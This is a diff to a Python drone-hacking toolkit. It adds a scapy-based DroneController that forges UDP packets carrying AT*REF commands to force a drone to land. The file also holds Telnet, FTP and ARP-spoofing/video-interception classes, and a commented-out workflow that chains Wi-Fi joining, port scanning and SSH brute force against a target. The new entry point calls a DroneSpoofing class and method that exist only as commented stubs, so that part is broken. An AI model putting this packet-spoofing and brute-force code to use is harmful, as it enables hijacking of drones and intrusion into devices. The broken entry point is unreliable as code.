@@ -5,6 +5,7 @@ import os
 import hashlib
 import signal
 import math
+from time import sleep
 import sys
 from scapy.all import *
 import paramiko
@@ -411,7 +412,7 @@ class DroneFTPConnector:
         except Exception as e:
             print(f"Error while disconnecting: {e}")
 
-# Telnet Hackin
+# Telnet Hacking
 class TelnetConnector:
     def __init__(self, drone_ip, open_ports):
         self.drone_ip = drone_ip
@@ -450,10 +451,48 @@ class TelnetConnector:
         except Exception as e:
             print(f"Error while disconnecting: {e}")
 
+# Drone Spoofing
+#class DroneSpoofing:
+    # Get drone MAC address
 
 # Drone Conroller
-            
+class DroneController:
+    def __init__(self, srcIP, dstIP, srcPort, dstPort, srcMAC, dstMAC, interface="wlan0"):
+        self.srcIP = srcIP
+        self.dstIP = dstIP
+        self.srcPort = srcPort
+        self.dstPort = dstPort
+        self.srcMAC = srcMAC
+        self.dstMAC = dstMAC
+        self.interface = interface
+
+    def send_spoofed_packets(self):
+        print("Sending spoofed land packets")
+        for i in range(1, 10):
+            payload = "AT*REF=" + str(1000000 + i) + ",290717696\r"
+            print(payload)
+            spoofed_packet = Ether(src=self.srcMAC, dst=self.dstMAC) / \
+                             IP(src=self.srcIP, dst=self.dstIP) / \
+                             UDP(sport=self.srcPort, dport=self.dstPort) / payload
+            sendp(spoofed_packet, iface=self.interface)
+            sleep(0.3)
+
+    def restore_control(self):
+        print("Wait 5 seconds before restoring control")
+        sleep(5)
+        print("Send a spoofed packet with seq=1 to restore control")
+        payload = "AT*REF=1,290717696\r"
+        print(payload)
+        spoofed_packet = Ether(src=self.srcMAC, dst=self.dstMAC) / \
+                         IP(src=self.srcIP, dst=self.dstIP) / \
+                         UDP(sport=self.srcPort, dport=self.dstPort) / payload
+        sendp(spoofed_packet, iface=self.interface)
+
+# turnon camera 
+
+
 # Dump
+
 # ARP Spoofing & Vidieo Intercepting
 class ARPSpoofer:
     def __init__(self, target_ip, spoof_ip, interface):
@@ -483,5 +522,41 @@ class ARPSpoofer:
         print("[+] ARP spoofing stopped.")
 
 # Vieo Intercepting
+        
+# Report
+
+# metigations
+
             
-# main
+# main  
+drone_spoofing = DroneSpoofing("wlan0")
+drone_spoofing.spoof_packets()
+drone_spoofing.restore_control()
+'''def main():
+    user_manager = UserManagement()
+    if not user_manager.login():
+        return
+
+    interface_manager = InterfaceManager()
+    interface = interface_manager.get_user_input()
+
+    wifi_toolkit = WiFi_toolkit(interface)
+    wifi_toolkit.display()
+    wifi_name = wifi_toolkit.select_network()
+    password = input("Enter the password for the selected network: ")
+    wifi_toolkit.connect_to_wifi(wifi_name, password)
+
+    subnet = wifi_toolkit.extract_subnet(interface)
+    target_ip = wifi_toolkit.select_target_device(subnet)
+
+    port_scanner = PortScanner(target_ip)
+    open_ports = port_scanner.scan_ports()
+    print("Open ports:")
+    for port, service in open_ports:
+        print(f"{port}/{service}")
+
+    ssh_brute_force = SSHBruteForce(target_ip, open_ports, "usernames.txt", "passwords.txt")
+    ssh_brute_force.brute_force_ssh()
+
+    drone_selector = DroneSelector()
+    manufacturer = drone'''
